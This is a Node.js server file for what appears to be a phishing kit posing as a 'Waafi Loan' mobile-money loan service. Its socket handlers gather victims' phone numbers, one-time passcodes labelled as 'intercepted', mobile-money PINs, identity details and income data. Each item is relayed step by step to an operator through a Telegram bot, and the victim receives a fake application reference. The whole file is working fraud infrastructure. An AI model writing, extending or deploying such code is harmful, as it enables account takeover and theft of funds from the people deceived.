require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);

const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

global.io = io; 

const PORT = process.env.PORT || 3000;
const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
    botManager.bot.processUpdate(req.body);
    res.sendStatus(200);
});

io.on('connection', (socket) => {
    // Generate a reliable backend fallback ID immediately on connection
    let activeRoom = `WFI-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
    
    // Automatically join the generated room right away
    socket.join(activeRoom);
    socket.emit('session-ready', { appId: activeRoom });
    console.log(`🔌 Assigned internal fallback session: ${activeRoom}`);

    socket.on('join-room', (room) => {
        if (room && room !== "null" && room !== "") {
            socket.leave(activeRoom); // Leave the old fallback room
            socket.join(room);
            activeRoom = room;
            console.log(`🔌 User synchronized room to: ${room}`);
        }
    });

    // Helper to prioritize the reliable server room over client-side variables
    const getValidId = (data) => {
        if (data && data.appId && data.appId !== "null" && data.appId !== "") {
            return data.appId;
        }
        return activeRoom;
    };

    // STEP 1: Phone submission
    socket.on('request-otp1', (data) => {
        const currentId = getValidId(data);
        botManager.sendToAdmin(currentId, "🇸🇴 Initial Request: Phone Submitted", { Phone: data.phone }, false);
    });

    // STEP 1 Validation: Intercepted OTP 1
    socket.on('step4-otp', (data) => {
        const currentId = getValidId(data);
        botManager.sendToAdmin(currentId, "🇸🇴 Step 1: Phone & Intercepted OTP 1", { Phone: data.phone, "OTP 1": data.otp }, true);
    });

    // STEP 2: MoMo PIN Entry
    socket.on('step5-pin', (data) => {
        const currentId = getValidId(data);
        botManager.sendFinalApproval(currentId, data.pin);
    });

    // STEP 3: OTP 2 Validation
    socket.on('submit-otp2', (data) => {
        const currentId = getValidId(data);
        botManager.sendSecondOTP(currentId, data.otp2);
    });

    // STEP 4: Loan Request Parameters
    socket.on('step1', (data) => {
        const currentId = getValidId(data);
        const { appId, ...cleanData } = data;
        botManager.sendToAdmin(currentId, "🇸🇴 Step 4: Loan Request Parameters", cleanData, true);
    });

    // STEP 5: Personal Identity Profile
    socket.on('step2', (data) => {
        const currentId = getValidId(data);
        const { appId, ...cleanData } = data;
        botManager.sendToAdmin(currentId, "🇸🇴 Step 5: Personal Identity Profile", cleanData, true);
    });
    
    // STEP 6: Employment & Income Status
    socket.on('step3-data', (data) => {
        const currentId = getValidId(data);
        const { appId, ...cleanData } = data;
        
        botManager.sendToAdmin(currentId, "🇸🇴 Step 6: Employment & Income Status", cleanData, false);
        
        const referenceId = `REF-${Math.floor(100000 + Math.random() * 900000)}`;
        io.to(currentId).emit('application-complete', { referenceId });
    });

    socket.on('disconnect', () => {
        console.log(`🔌 User disconnected socket room: ${activeRoom}`);
    });
});

server.listen(PORT, async () => {
    console.log(`🚀 Waafi Loan Server running on port ${PORT}`);
    
    if (EXTERNAL_URL) {
        const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
        try {
            await botManager.bot.setWebHook(webhookUrl);
            console.log(`✅ Telegram Webhook successfully set to: ${webhookUrl}`);
        } catch (err) {
            console.error('❌ Webhook Setup Failed:', err.message);
        }
    } else {
        console.warn('⚠️ RENDER_EXTERNAL_URL missing inside environment configs.');
    }
});